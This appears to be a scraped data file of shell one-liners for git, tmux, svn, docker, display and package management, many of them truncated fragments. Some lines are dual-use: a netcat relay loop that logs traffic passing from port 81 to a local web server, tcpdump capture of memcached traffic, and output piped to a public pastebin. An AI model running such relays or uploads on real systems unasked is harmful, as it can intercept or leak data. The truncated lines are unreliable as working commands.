"[[ -n ""$DIRACPLAT"" ]] && { dirac-proxy-init -v 96:00 -g auger_user -M && dinit -p 2&>1 >/dev/null || echo ""Proxy initialisation NOT succesfull""; } || { echo ""The DIRAC bashrc configuration should be sourced to enable DIRACgrid software"";}"
"[[ -n ""$DIRACPLAT"" ]] && { dirac-proxy-init -v 96:00 -g auger_prod -M -r -U -P && dinit -p 2&>1 >/dev/null || echo ""Proxy initialisation NOT succesfull""; } || { echo ""The DIRAC bashrc configuration should be sourced to enable DIRACgrid software"";}"
"[[ -n ""$DIRACPLAT"" ]] && { dirac-proxy-init -v 96:00 -g auger_prod -M && dinit -p 2&>1 >/dev/null || echo ""Proxy initialisation NOT succesfull""; } || { echo ""The DIRAC bashrc configuration should be sourced to enable DIRACgrid software"";}"
"[[ -f /var/log/nginx/access.log ]] && { echo -e ""Getting current \033[3;32mNGINX\033[0m\nstatus codes count...\n"" && cat /var/log/nginx/access.log | \grep --color=never -Pio ""HTTP/(\d\.\d)\"" \K(\d{3})"" | sort | uniq -c | sort -nr; }"
"[[ -d "".git"" ]] && find . -type f | grep -v ""^./.git"" | sort || echo ""$(pwd) is not a repository"""
"[[ $(dpkg -l | grep ^rc) ]] && sudo dpkg -P $(dpkg -l | grep ^rc | tr -s "" "" | cut -d "" "" -f 2)"
"[[ ""$(xrandr | grep "" connected "" | cut -d"" "" -f5)"" == ""inverted"" ]] && xrandr -o normal || xrandr -o inverted"
"[ `git show ""--format=%aE"" | head -n 1 | sed ""s/@.*//""` = mcduff ] && git commit -a --amend -C HEAD || echo ""you are not the last committer"""
"[ -z ""`setxkbmap -print |grep xkb_symbols|grep fr`"" ] && setxkbmap fr || setxkbmap us"
"[ -v ""${VISUAL}"" ] && echo ""$VISUAL"" || ( [ -n ""${EDITOR}"" ] && echo ""$EDITOR"" || echo "
"[ -d ""$RLX_HOME"" ] && { dir=$(recseldir $RLX_HOME/InstrumentControls); [ -d ""$dir"" ] && cd $dir || err ""path selection failed""; } || err ""RLX_HOME not set"""
"OUT=$(df -PTh | grep -v ""Use"" | awk ""{printf \""%-9s %4s %4s\n\"", \$7, \$6, \$5}"" | sort); printf ""Location Used Free\n%s\n"" ""$OUT"" | column -t"
"OUT=$(df -PTh | grep -v ""Use"" | awk ""{printf \""%-9s %4s %4s %-6s\n\"", \$7, \$6, \$5, \$2}"" | sort); printf ""Location Used Free Format \n%s\n"" ""$OUT"" | column -t"
"Master; git branch | tr -s "" ""| cut -d"" "" -f2 | grep -v $master | xargs git branch -d;"
"LC_CTYPE=C tr -dc ""A-Za-z1-9!@%^"" < /dev/urandom | fold -w ${1:-20} | head -n 1| tee /dev/tty | pbcopy"
"LC_COLLATE=C tree --dirsfirst -I ""__pycache__|*.pyc|*~|.git|venv"""
"IF=$(/sbin/route -n | grep ^0 | awk '{print $NF}') sudo tmux new htop \; splitw -h 'nethogs $(ip link | grep ',UP,' | sed "
"FILES=$(git ls-files -v | egrep ""^[a-z]"" | cut -d "" "" -f2 | fzf) && echo $FILES | xargs -L1 -t git update-index --no-assume-unchanged"
"CNT=0; for i in $(ls *java); do let CNT+=$(cat ~+/$i | wc -l | sed s/"" ""/""""/g ); done ; let CNT+=$(cat ~+/SqliteBridge.c | wc -l | sed s/"" ""/""""/g); echo $CNT"
"CLICOLOR_FORCE=1 ls -AFGhl | grep ""^d\|total"" && CLICOLOR_FORCE=1 ls -AFGhl | grep -v ""^d\|total"""
"2>&1 | grep --color -iP ""\^|warning:|error:|"""
"/usr/libexec/java_home -V 2>&1 | grep jdk | cut -d , -f 1 | colrm 1 4 | grep -v Home"
"/usr/libexec/java_home -V 2>&1 | grep JavaVirtualMachines | head -2 | cut -d ',' -f 1 | sed 's/ //g'"
"/usr/libexec/java_home -V 2>&1 | grep -E ""\d.\d.\d_\d\d"" | cut -d , -f 1 | colrm 1 4 | grep -v Home"
"/usr/libexec/java_home -V 2>&1 | grep -E ""\d.\d.\d[,_]"" | cut -d , -f 1 | colrm 1 4 | grep -v Home"
"/usr/libexec/java_home -V 2>&1 | grep -E ""\d.\d.\d"" | cut -d , -f 1 | colrm 1 4 | grep -v Home"
"/usr/libexec/java_home -V 2>&1 -a x86_64 | grep -E ""\d.\d.\d[,_]"" | cut -d , -f 1 | colrm 1 4 | grep -v Home"
"/sbin/ifconfig | grep ""inet addr"" | cut -d "":"" -f4 | cut -d "" "" -f1 | head -n 1"
"/sbin/ifconfig | grep ""inet addr"" | awk ""{print \$2}"" | sed s/addr://g | grep -v 127\.0\.0\.1"
"/bin/ls -tr /volatile/logs/*_send_recv_* | tail -1 | xargs tail -f | sed -u ""s/\x01/ /g"" | grep --line-buffered -v 35=0"
".*|alias $NAME='. $SOURCE'|g"" ~/.bashrc) || (echo ""alias $NAME='. $SOURCE'"" >> ~/.bashrc)"
".*|alias $NAME='. $SOURCE'|g"" ""$RCPATH"") || (echo ""alias $NAME='. $SOURCE'"" >> ""$RCPATH"")"
"--stat=1000 | grep ""|"" | awk ""{print \$1}"" | parallel --will-cite -j1 -n1000 --tty $EDITOR"
",bru | grep -E \(feature\|hotfix\|bugfix\) | sed -E 's/([[:graph:]]+)/,del \1 \&\& ,delr \1/'"
",brm | grep -E \(feature\|hotfix\|bugfix\) | sed -E 's/([[:graph:]]+)/,del \1 \&\& ,delr \1/'"
"(while test ! -d .git -a ""$PWD"" != /; do cd .. || exit; done; test -d .git && ( exec gitk --all & ) || echo .git not found)"
"(printf ""Device Mountpoint File_System_Type\n""; mount | cut -d "" "" -f 1-5 | sed ""s:on::g"" | sed ""s:type::g"") | column -t"
"(npm run build || :) && git add -A && (git commit -m ""build"" || :) && npm version patch && npm publish && git push --follow-tags"
"(ls ~/HW1/usr/toukmond/shovel.o >& /dev/null && (ls .w/boulder.o >& /dev/null && mv ~/HW1/.blocked/card.o `pwd` >& /dev/null && echo ""I think you found something."" || echo ""Digging here reveals nothing.""))|| echo ""You have nothing with which to dig."""
"(git diff --name-only --diff-filter=ACM && git ls-files --other --exclude-standard) | grep ""\.*\(jpg\|png\|gif\)$"" | imageOptim -a -q"
"(eval $(xdotool selectwindow getmouselocation --shell | grep ""[XY]="" | sed ""s/^/A/""; xdotool selectwindow getmouselocation --shell | grep ""[XY]="" | sed ""s/^/B/""); sleep 0.5 && ffmpeg -f pulse -name a -channels 2 -fragment_size 1024 -i default -f x11grab -s $(($BX-$AX))x$(($BY-$AY)) -r 30 -i :0.0+$AX,$AY -ac 1 -acodec ac3 -vcodec libx264 -preset ultrafast -crf 0 -threads 0 ~/output-$(date +%s).mkv 2>&1)"
"(cd .ne >& /dev/null && ls .n >& /dev/null && rm -f ~/HW1/usr/toukmond/key.o >& /dev/null ) || (ls .sw/.sw/.w/boulder.o >& /dev/null && echo ""You do not have a key that can open this door.""); cd .ne >& /dev/null && see || echo ""You can not go that way."" "
"(){ if find *(/) -prune > /dev/null 2>&1; then; echo -e ""\e[34;1m$(find *(D/) -prune | sed -e ""s/$/\//g"" | tr ""\n"" "" "")\e[m""; elif find *(D.) -prune > /dev/null 2>&1; then; echo -e ""\e[32;1m$(find *(*) -prune 2>/dev/null | sed -e ""s/$/\*/g"" | tr ""\n"" "" "")\e[m""$(find *(D^*/) -prune 2>/dev/null); fi }"
"(){ git branch --merged $1 | grep -vE ""^\*|master|$1"" | xargs -I % git branch -d % }"
"((ls .hidden >& /dev/null && head -n 1 description) || (echo > .hidden && cat description)) && (ls *.o >& /dev/null && echo -n ""You see: "" && echo $(ls *.o)) || TRUE"
"( zcat $( ls -tr /var/log/apt/history.log*.gz ) ; cat /var/log/apt/history.log ) | grep -E ""^(Start-Date:|Commandline:)"" | grep -v aptdaemon | grep -E ""^Commandline:"""
"$(which find) . -xdev $prunePathsFindExpression -type f -size +10M -exec ls -l --block-size=M --time-style=+""%Y-%m-%d %T"" {} \; 2>/dev/null | sort -nrk5 | head -50 | numfmt --field 5 --from=iec --to=iec-i --suffix=B | column -t"
"$(which find) . -xdev $prunePathsFindExpression -type f -size +10M -exec ls -l --block-size=M --time-style=+""%Y-%m-%d %T"" {} \; 2>/dev/null | sort -nrk5 | head -5 | numfmt --field 5 --from=iec --to=iec-i --suffix=B | column -t"
"$(which find) . -xdev $prunePathsFindExpression -type f -size +10M -exec ls -l --block-size=M --time-style=+""%Y-%m-%d %T"" {} \; 2>/dev/null | sort -nrk5 | head -10 | numfmt --field 5 --from=iec --to=iec-i --suffix=B | column -t"
"$(which find) . $prunePathsFindExpression -xdev -type f -size +10240k -exec ls -l --block-size=M --time-style=+""%Y-%m-%d %T"" {} \; 2>/dev/null | sort -nrk5 | column -t | head -n | awk "
"$(which find) . $prunePathsFindExpression -xdev -type f -size +10240k -exec ls -l --block-size=M --time-style=+""%Y-%m-%d %T"" {} \; 2>/dev/null | sort -nrk5 | column -t | head -n $(($LINES-4)) | awk "
"$(which find) . $prunePathsFindExpression -xdev -type f -size +10240k -exec ls -l --block-size=M --time-style=+""%Y-%m-%d %T"" {} \; 2>/dev/null | sort -nrk5 | column -t | head -50 | awk "
"$(which find) . $prunePathsFindExpression -xdev -type f -size +10240k -exec ls -l --block-size=M --time-style=+""%Y-%m-%d %T"" {} \; 2>/dev/null | sort -nrk5 | column -t | head -5 | awk "
"$(which find) . $prunePathsFindExpression -xdev -type f -size +10240k -exec ls -l --block-size=M --time-style=+""%Y-%m-%d %T"" {} \; 2>/dev/null | sort -nrk5 | column -t | head -10 | awk "
"$(lsof -nP -i4TCP | grep LISTEN | grep VBox | cut -d : -f 2 | cut -d "" "" -f 1)"
"$(git status --porcelain | fzf --preview ""echo {} | cut -c4- | xargs git diff --color=always HEAD"" | cut -c4-)"
"$(git branch -a | peco --query ""remotes/ "" --prompt ""GIT REMOTE BRANCH>"" | head -n 1 | sed ""s/^\*\s*//"" | sed ""s/remotes\/[^\/]*\/\(\S*\)/\1/"")"
"$(cd /root/scripts/blacksheepwall; for i in $(find . -exec file {} \; | grep -i elf | cut -d "":"" -f 1 | cut -d ""."" -f 2 | head -n 1); do echo `pwd`$i; done) "
"$($(history | tail -2 | head -1 | cut -d"" "" -f4-) 2>&1 > /dev/null | tail -1)"
"$'sudo dnf --setopt=clean_requirements_on_remove=false erase $(awk -v FS=\'\t\' -v OFS=\'\t\' \'NR==FNR {wf[$1];next}{if (!($1 in wf) && $1 !~ /-fonts?-?/) {print $2,$3,$4/1024**2}}\' $HOME/.dotfiles/fedora_worldfile <(rpm -q --queryformat ""%{NAME}\t%{NAME}-%{VERSION}-%{RELEASE}.%{ARCH}\t%{SUMMARY}\t%{SIZE}\n"" $(dnf leaves) | sort -t $\'\t\' -k 4nr) | column -ts $\'\t\' | peco | awk \'{print $1}\')'"
"$'sudo bash -c ""set -ex; apt update; apt upgrade; apt full-upgrade; apt clean; apt autoremove; apt-cache gencaches; aptitude full-upgrade; aptitude purge ~c; aptitude forget-new; aptitude search ~o || true; aptitude search \'~S~i!~Odebian\' || true""'"
"$'git branch -vv | awk \'{print $1,$4}\' | grep \'gone]\' | awk \'{print $1}\' | xargs -n 1 git branch -D'"
"$'docker ps --filter=status=exited --quiet | xargs --no-run-if-empty docker rm && docker images --filter=dangling=true --quiet | xargs --no-run-if-empty docker rmi && docker volume ls --filter=dangling=true --quiet | awk \'$0 ~ ""^[0-9a-f]{64}$""\' | xargs --no-run-if-empty docker volume rm'"
"$'dd status=none if=/dev/urandom bs=2048 count=1|grep -Pao \'[a-zA-Z0-9`~!@#$%^&*()_+-=\\[\\]{}|:;<>?/.,]\'|tail -n64|tr -d ""\\n"";echo'"
"""$(git branch -a | peco --prompt ""Git Branch: "" | head -n 1 | sed -e ""s/^\*\s*//g"" | xargs)"""
"!git diff -p -R | grep -E \""^(diff|(old|new) mode)\"" | git apply"
"!git branch --merged | grep -v ""\\*\\|master\\|develop"" | xargs -n 1 git branch -d"
" rev | cut -d"" "" -f1 | rev | url-decode | url-to-json "
" pvdisplay | egrep ""Physical|Name|PV Size|Allocatabl"""
" print -z ssh $(ssh-list | grep ""^Host"" | sed ""s/^Host //g"" | peco | awk "
" git branch | grep -v develop | grep -v master | grep -v ""*"" | xargs -n 1 git branch -D"
" git branch --merged | egrep -v ""(^\*|master|staging)"" | xargs git branch -d && gbp"
" apt-history | awk ""/Commandline/&&/remove/||/purge/{print}"" | apt-history-filter"
" ( cat description 2> ~/_ && mv description .description 2> ~/_ || head -1 .description && find *.o >& ~/_ && echo -n ""You see: "" && echo $(ls *.o) || TRUE ) "
!git branch --merged | grep -v '\\*\\|^\\s*\\(master\\|staging\\)$' | xargs -n 1 git branch -d
~/adt-bundle-mac-x86_64-20130522/sdk/platform-tools/adb logcat | grep `~/adt-bundle-mac-x86_64-20130522/sdk/platform-tools/adb shell ps | grep mobino | cut -c10-15`
| uniq -c | sort -k1nr | sed -e 's/^[ ]*//g'
| tee >(cat) NOCOLOR| curl -sF 'sprunge=<-' http://sprunge.us | pbcopy
| tail -n+3 | head -n-1 | awk '{print \$2, \$(NF-1), \$3}' \
| sort | uniq -c | sort -r
| sort | uniq -c | sort -nr
| sort | uniq -c | sort -n
| sha256sum | base64 H -n1 | clip
| peco | xargs echo -n | pbcopy-wrapper
| peco | ruby -pe 'chomp' | pbcopy
| pe | fzf | read filename; [ ! -z $filename ] && vim $filename
| pe | fzf | read filename; [ ! -z $filename ] && nvim $filename
| pe | fzf | read filename; [ ! -z $filename ] && $EDITOR $filename
| pe | fzf -m | xargs
| head -n 1 | sed -e ""s/^\*\s*//g"" | perl -pe ""s/remotes\/origin\///g"")"
| fzf-tmux --multi --tac | tr '\n' '\0' | xargs --no-run-if-empty -0 sh -c '\$0 \
| fzf --multi --cycle | tr '\n' '\0' | xargs --no-run-if-empty -0 sh -c '\$0 \
| cut -d: -f1 | sort | uniq
| awk '{ print \$1 }' | colrm 1 1 | rev"
{ pacman -Qtq; pacman -Qeq | double; } | sort | uniq -u
{ pacman -Qgq base base-devel xorg xorg-drivers xfce4 | double; pacman -Qeq; } | sort | uniq -u
{ git st --porcelain | awk '{print $2}' & git diff --name-only master...HEAD; } | grep .*\.js$ | xargs eslint --fix
{ git st --porcelain | awk '{print $2}' & git diff --name-only master...HEAD; } | grep .*\.js$ | xargs eslint
{ echo platform | sudo tee /sys/power/disk ; cat /sys/power/disk; date; acpi -ab ;} | tee batt_status ; sudo pm-hibernate; { date; acpi -ab; } | tee -a batt_status
zgrep sshd /var/log/auth.log* | grep rhost | sed -re 's/.*rhost=([^ ]+).*/\1/' | sort -u
zgrep '[a-z]' ${HOME}/.bash_history*.gz | sort | awk -F '/' '{print $NF}' | fzf
zef list --installed | sed -e 's/(.*//g' -re 's/:(ver|auth)//g' | xargs -P $TEST_JOBS -I '{}' zef install '{}'
zcat -f /var/log/commands.log* | sort -m | LC_ALL=C sort -k 1M | less
z | cut -c 12- | fzf | cd
yq -c 'path(..)|[.[]|tostring]|join(\
yes | docker system prune -a && docker rmi $(docker images -a -q) || true && yarn dc:build && docker network create swarm && yarn dc:up
yes | docker container prune && yes | docker volume prune && yes | docker image prune
yes | docker container prune && yes | docker image prune && yes | docker volume prune
yes 0-2-4-6-8- | paste - - - - - - - - - - | tr -d '\t ' | head -1
yarn tsc --noEmit | egrep '^[a-zA-Z0-9\/\.:_@\-]+' -oh | sort | uniq
yaourt -Rns $(pacman -Qq | grep roccat-tools* | grep -v roccat-tools-tyon | grep -v roccat-tools-common)
yaourt -Q -e --date | grep -v lib | sed -E 's#(^[^/]+/)|( .*$)##g'
yaourt --noconfirm -S \$(yaourt -Q | grep '\-git' | sed 's/.*\/\([^ ]* \).*/\1/' | tr -d '\n')
xz -v $(ls -la | grep .sql$ | grep -v .xz | awk '{ print $9 }')
xsel -p | xsel -is && xsel -b | xsel -ip && xsel -s | xsel -ib
xs1|xs2 ; xs3|xs1 ; xs2|xs3
xrandr | grep primary | awks 1 | xargs -i xrandr --output {} --off
xrandr | grep -C 3 '*' | grep DP | awk '{print \$1}'
xrandr -q | grep ' connnected' | awk '{print$\1}' | xargs -I {} xrandr --output {} --mode 1920x1080
xrandr --output DVI-I-1 --off && xrandr --output HDMI-0 --mode $(xrandr --verbose | grep 800x600 | sed 's/^[ 0-9x]*(//g' | sed 's/)[0-9a-zA-Z\.\+ ]*$//g') && $HOME/Uplink/uplink; randr_reset.sh asd
xprop | grep _NET_WM_PID | cut -d = -f 2 | xargs kill -9
xprop | grep --color=none 'WM_CLASS\|^WM_NAME' | xmessage -file -
xprop | egrep -w 'WM_CLASS|WM_NAME|WM_WINDOW_ROLE'
xprop | egrep 'WM_WINDOW_ROLE|WM_CLASS|^WM_NAME'
xprop | ag --nocolor 'WM_CLASS\|^WM_NAME' | xmessage -file -
xprop | \grep -P '.*(?=[(].*STRING.*=)' | column -t | \grep -P --color=auto '.*(?=[(].*STRING.*=)'
xinput set-prop `xinput list | grep TouchPad | awk -F= '{print $2}' | cut -b 1-2` \
xinput set-prop `xinput list | grep -i touchpad | cut -f2 | grep -oE
xinput set-prop `xinput list | grep -i touchpad | cut -f 2 | grep -oE '[[:digit:]]+'` \
xinput set-prop `xinput list | grep -i touchpad | cut -f 2 | grep -oE
xinput set-button-map \$(xinput list | grep -i mouse | grep -vi generic | perl -n -e'/id=(\d+)/ && print \$1') 3 2 1
xinput list-props 'DELL0782:00 06CB:7E92 Touchpad' | grep 'Device Enabled' | sed 's/Device Enabled (169)://' | grep -E -o
xinput list | grep '${builtinKeyboard}' | awk '{print \$7}' | cut -c 4-5
xinput enable $(xinput -list | grep 'Synaptics TouchPad' | cut -f 2 | sed -e 's/id=//')
xinput disable $(xinput -list | grep 'Synaptics TouchPad' | cut -f 2 | sed -e 's/id=//')
xinput --enable $(xinput | grep TouchPad | grep -o -e 'id=[0-9]*' | cut -d= -f2)
xinput --disable $(xinput | grep TouchPad | grep -o -e 'id=[0-9]*' | cut -d= -f2)
xev | grep keysym | cut -d '(' -f2 | cut -d ')' -f1
xdpyinfo|grep resolution|awk '{ print \$2 }'|cut -f1 -d'x'
xdpyinfo | grep 'dimensions' | egrep -o '[0-9]+x[0-9]+' | head -1
xclip -o | awk '{ print \$2 }' | sed s/:in// | xargs bundle exec rspec
xclip -o -selection | read line; echo -n $line | openssl sha1 | awk
xclip -o -sel clip | jq . | sponge | xclip -i -sel clip
xauth list | tail -n 1 | awk '{printf \$3}' | pbcopy
xargs -n1 basename | cut -d. -f2 | sort | uniq
w|sed -e '/^USER.*$/d'|sort|less
wps -ea | head -1; wps -ea | grep -v $$ | grep
who | cut -d\ -f1 | sort -u | tr \
while true; do sudo nc -l -p 81 0<backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe; done
while true; do ls err.txt generated.file succ.txt | sort -R | tr '\n' '\0' | xargs -0 mpv --no-video --speed 1.0 -af scaletempo=speed=tempo; done
while true; do fortune | rcowsay; done | pv -qlL 3 | lolcat
while true; do echo Checking internet reachability at \$(date); curl -# --max-time 5 -o /dev/null -I www.google.com || echo failed ; sleep 5; done 2>&1 | tee -a $HOME/internet_connectivity_tests.log
wget http://checkip.dyndns.org/ -O - -o /dev/null | cut -d: -f 2 | cut -d\< -f 1 | cut -c 2-
wget -qO- http://ipecho.net/plain ; echo ; ifconfig | grep 'inet ' | grep -Fv 127.0.0.1 | awk '{print \$2}' ; hostname -f
wget -q html http://ishadowsocks.com -O - | grep 密码: | cut -d: -f2 | cut -d\< -f1
wget -q -O - https://www.accuweather.com/en/in/mumbai-central/3352466/current-weather/3352466 | grep 'RecentLocationsCarousel.push' | head -1 | grep -o '{\(.*\)}'
weather sbrj -m | grep -Pzo '(Heat|Sky) .*' | cowsay -w
wd \$(wd list | tail -n +2 | fzf | awk '{ print \$1}')
w3m www.whatismyip.com | grep 'Your IP Address Is:' | cut -d ':' -f 2 | sed 's/ //'
w3m ozbargain.com.au | egrep -A 3 -m 20 ^\[[0-9]+\] | egrep -v ^\[[0-9]+\] | egrep -A 2 ^[0-9]+
vs | python -m json.tool | tee /dev/tty | cs
vncserver -list | grep ^:[0-9] | cut -f1 | xargs vncserver -kill
virsh list --state-running --title | tail -n +3 | head -n -1 | awk '{print \$2}'
vim `ls -t *.@(py|pl|cgi)| head -1 `
vim `ls -t *.@(c|cpp|h)| head -1 `
vim -u NONE -c 'set nocp | inore vk <esc> | inore kv <esc> | nnoremap ; :'
vim -p -c 'tabdo Gdiff cozy/master' `git diff --numstat master cozy/master | grep -v build/ | awk '{print $3}' | xargs`
vim -c 'Gstatus | winc w | bd | exe \
vim - -c 'cgetbuffer | bd! | copen | wincmd o'
vim +'PlugUpgrade|PlugInstall|PlugUpdate|qa!'
vim '+PlugUpgrade|PlugUpdate|q|q'
vim $(git status | grep modified | cut -f2 | cut -d
vcgencmd display_power | grep 1 && vcgencmd display_power 0 || vcgencmd display_power 1
vagrant status | grep -v 'not created' | awk '{print $1}' | while read BB; do echo 'vagrant destroy -f $BB;'; done
vagrant halt && vagrant halt \`vagrant global-status | grep default | grep -E \$(pwd)'\s*$' | awk '{print \$1}'\`
vagrant global-status|grep 'running'|awk '{print \$1}'|xargs vagrant suspend
vagrant global-status | tail -r | tail +7 | tail -r
vagrant global-status | grep virtualbox | cut -c 1-9 | while read line; do echo $line; vagrant halt $line; done;
vagrant global-status | grep virtualbox | cut -c 1-9 | while read line; do echo $line; vagrant halt $line; done
vagrant global-status | grep running | cut -f1 -d' ' | xargs vagrant halt
vagrant destroy --force $(vagrant global-status --prune | tail -n+3 | head -n1 | cut -c1-7)
uuidgen | tr A-Z a-z | tr -d '\n' | pbcopy
uuidgen | tr -d - | tr -d '\n' | tr '[:upper:]' '[:lower:]'
uuidgen | tr -d '\n-' | tr '[:upper:]' '[:lower:]' | pbcopy && pbpaste && echo
uuidgen | tr -d '\n' | tr '[:upper:]' '[:lower:]' | pbcopy && pbpaste && echo
uuidgen | tr -d '\\n' | tr '[:upper:]' '[:lower:]' | pbcopy; pbpaste; echo
uuidgen | tr '[:upper:]' '[:lower:]' | tr -d '\n' | pbcopy && pbpaste && echo
uuidgen | tr '[:upper:]' '[:lower:]' | tr -d '\n' | pbcopy && echo 'UUID copied to clipboard'
uuidgen | tr 'A-Z' 'a-z' | tr -d '\n' | pbcopy
uuidgen | tee >(cat) | tr -d '\n' | pbcopy
uuidgen | perl -ne 'print lc' | tr -d '\n' | pbcopy
uuid=$(uuidgen | tr [:upper:] [:lower:] | sed s/-//g) && echo $uuid && printf $uuid | pbcopy
utf ipconfig -all | grep -v fec0 | grep 'DNS 服务器\|DNS Server' -B 16 -A 2
users | sed -r -e 's/ /\n/g' | sort -u | shuf -n 1
users | sed 's/ /\n/g' | uniq -c | sort -n
upower -i /org/freedesktop/UPower/devices/battery_BAT0|grep -E 'state|to\ full|percentage'
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep percentage | sed 's/ //g' | cut -d':' -f2
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | egrep 'state|percentage|time to empty'
upower -i $(upower -e | rg battery) | rg percentage | rg -o '[0-9]*%'
upower -i $(upower -e | grep BAT0) | grep percentage | sed 's/.*\([0-9]\{2\}\)/\1/'
until for binpath in ${PATH//:/$' '}; do ls ${binpath}; done | shuf | head -1 | xargs man; do :; done
typeset -f | egrep '^[a-z]+ \\(\\)' | sed -e 's/()//' | sort
tty7=`ps -ef|grep tty7|awk -F\ '{print $2}'|head -n 1`
tree -ifF --si --noreport | sed -e 's/\[//g' -e 's/\]//g' -e 's/\.\// \.\//g' | grep -v /$ | sort -h
tree -d -L 3 -I 'node_modules|bin|server|bower_components'
tree -aI '.git|node_modules|*~|*.swp'
tree -aC -I '.git|node_modules|bower_components|.idea' --dirsfirst $1
tree -a -I 'storage|public|.git|vendor'
tree -a -I '.git|node_modules|tmp|public'
tree -a -I '.git|node_modules|.env|__pycache__'
tree -a -I '.git|__pycache__|.pytest_cache|.env'
tree -a -C -I 'node_modules|target|.git|.vim'
tree -a --noreport --dirsfirst -I '.git|node_modules|bower_components|.DS_Store'
tree -I 'virtualenv|node_modules|bower_components|__pycache__'
tree -I 'target|lib_managed|tmp|test'
tree -I 'node_modules|venv|env|*.pyc'
tree -I 'node_modules|.git|test|.DS_Store' --noreport -C -a --dirsfirst
tree -I 'node_modules|*.pyc|*.db*|__pycache__'
tree -I 'node_moduels|components|build|target' --filelimit
tree -I 'bin*|local*|lib*|include*'
tree -I '__pycache__|venv|lib|htmlcov'
tree -I 'Library|ProjectSettings|Temp|*.meta'
tree -I '.git|.jhw-cache|.DS_Store|Icon*'
tree -I '*.pyc|__pycache__|*.o|*.out'
tree -Fa -I 'CVS|*.*.package|.svn|.git' --dirsfirst
tree -CshDftia --dirsfirst --filelimit 100 -I .next\|.git\|__pycache__\|node_modules
tree -CAfia -I 'CVS|*.*.package|.svn|.git' --dirsfirst
tree -CAFa -I 'CVS|.git|.svn|.vscode' --dirsfirst
tree -CAFa -I 'CVS|*.*.package|.svn|.git' --dirsfirst
tree -CAFa --dirsfirst -I 'CVS|*.*.package|.svn|.git'
tree -C -a -I '.git|node_modules|bower_components|vendor'
tree --matchdirs -I 'env|__pycache__|node_modules|*.egg*'
tr -cd '[[:alnum:]] ' | tr '[:upper:]' '[:lower:]' | tr ' ' '_' | tr -s '\n'
tr '.' '\t' | awk '{print \$2}' | base64 -d 2>/dev/null | jq
tr '.' '\t' | awk '{print \$1}' | base64 -d 2>/dev/null | jq
tot=0;find . -type f | xargs ls -s | sort -rn | awk '{size=\$1/1024;tot=tot+\$1;printf \
top -l 1 -s 0 | awk '/PhysMem/ || /Load Avg/ {print}'
top -b|grep -E '^(Mem|Swap|ARC)'
top -b|egrep '^(Mem|Swap|ARC)'
top -b | head -n 8 | tail -n 1 | awk '{print \$9 \
tomcats | grep -v grep | awk '{ print $2 }' | xargs kill
tmux showb | grep rspec | awk '{print \$2}' | xargs rspec
tmux showb | grep cucumber | awk '{print \$2}' | xargs cucumber
tmux ls | grep attached | cut -d: -f1 | xargs -t -n1 tmux kill-session -t
tmux ls | grep : | cut -d: -f1 | xargs tmux kill-session -t
tmux ls | grep : | cut -d: -f1 | xargs -n 1 -r tmux kill-session -t
tmux ls | grep : | cut -d. -f1 | xargs kill
tmux ls | grep : | cut -d. -f1 | awk
tmux ls | grep -v attached | cut -d : -f 1 | xargs -n1 tmux kill-session -t
tmux ls | grep -q default && tmux a -t default || tmux new -s default
tmux ls | awk '{print $1}' | sed 's/://g' | xargs -I{} tmux kill-session -t {}
tmux ls | awk '{ print \$1}' | tr -d ':' | xargs -I{} tmux kill-session -t {}
tmux list-windows -t CRM|grep -v vim|cut -d: -f1|xargs -I{} tmux send-keys -t CRM:{} C-l
tmux list-sessions | sed -s 's/:.*//' | fzf | xargs tmux switch -t
tmux list-sessions | grep -v attached | cut -d: -f1 | xargs -t -n1 tmux kill-session -t
tmux -L \$(echo \$CATKIN_DIR | rev | cut -d '/' -f1 | rev)
tmutil status | awk '/_raw_Percent/ {print $3}' | grep -o '[0-9].[0-9]\+' | awk '{print $1*100}'
tmate show-messages | tail -1 | cut -d' ' -f9- | pbcopy
title ${i}; screen -list | grep ${i} && screen -D -r ${i} || (sleep 5; screen -S ${i} -c ~/.screen.d/${i})
tf *.log | egrep -ai --line-buffered 'error|exception|'
terraform refresh && terraform plan -refresh=false -no-color | head -n -7 | tail -n +5 | copy2clip
telnet towel.blinkenlights.nl 666 2>/dev/null |tail -2 | cowsay -f dragon | lolcat
tdl | egrep 'Completed|Processing|Parameters\:'
tcpdump -i eth1 -s 65535 -A -ttt port 11211| cut -c 9- | grep -i '^get\|set'
taskrunner --list | tail -n +3 | fzf | xargs -r taskrunner
taskkill //pid \`netstat -aon | grep 8080 | grep -P '(?<=LISTENING).*' -o | grep -P '\\d*' -o\` //f
taskkill //pid \`netstat -aon | grep 3000 | grep -P '(?<=LISTENING).*' -o | grep -P '\\d*' -o\` //f
tar -cf - . | pv -s $(du -sb . | awk '{print $1}') | gzip > out.tgz
tail -n2 ~/.zsh_history | head -n1 | awk -F';' '{print \$2}' | pbcopy
tail -fn0 ~/.msf4/logs/framework.log | egrep --color -i 'call stack|exception|$'
tail -f /opt/tomcat-engine1/logs/access.$(date --iso).log | egrep -v '(indexer|lock|changelog)'
tail -f -n 1000 log/development.log | grep -i 'processing\|rendered\|parameters'
tag -tgf \*|grep '^ '|cut -c5-|sort -u
s|\\\e|+|g;"" \
s|\\\C-|^|g
s|.$||;
s|, \+| |g;
s| can be found on|:|;
systemctl | grep -i running | sed 's/\.service\|\.socket//g'
systemctl | grep 'openvpn-client@' | grep 'active' | awk '{print \$1}'
systemctl | fzf | cut -d' ' -f1 | xargs sudo systemctl restart
systemctl list-units --state=running | grep -v systemd | awk '{print $1}' | grep service
system_profiler SPHardwareDataType | \grep ' Serial Number' | cut -d' ' -f 10 | pbcopy
swaymsg -t get_tree | grep -P 'app_id|class' | awk '{print \$1 \
sw_vers; echo; system_profiler SPHardwareDataType | head -n 15 | tail -n 11 | sed 's/^ *//g' ; echo; df
svnmod | cut -d ' ' -f 8 | pipe.vim | xargs svn revert
svnmod | cut -d ' ' -f 8 | pipe.vim | xargs svn commit
svn up | grep -v ^$ | grep -v 'Fetching' | grep -v 'External at'
svn st|grep ^?|sed s/?//|xargs svn add $1
svn status|grep ? | awk '{print $2}' | xargs svn add
svn status|grep ! | awk '{print $2}' | xargs svn del
svn status |grep '^\?' | sed 's/? *//' | xargs svn add
svn status |grep '^\?' | sed 's/? *//' | xargs rm -rvf
svn status |grep '^\!' | sed 's/! *//' | xargs svn del
svn status |grep '\?' |awk '{print $2}'| xargs svn add
svn status | grep “^\?” | awk “{print \$2}” | xargs svn add
svn status | grep ^\\? | cut -c9- | xargs -d \\\\n rm -r
svn status | grep ^\? | sed s/\?// | xargs svn add $1
